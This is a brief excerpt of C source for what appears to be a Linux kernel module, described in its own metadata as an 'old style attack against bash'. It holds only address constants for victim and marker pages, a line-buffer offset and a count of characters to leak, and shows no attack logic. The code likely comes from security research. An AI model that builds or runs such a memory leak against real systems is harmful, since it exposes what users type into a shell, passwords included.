...
#define ICMP_DATA_PAGE 0x1a61000
#define MARKER_PAGE 0x1a63000

#define VICTIM_PAGE 0xd837a10
#define USERSPACE_MARKER 0xda1c000

#define OFFSET_LINE_BUFFER 0xa10

#define CHARS_TO_LEAK 8
...
MODULE_DESCRIPTION("old style attack against bash");
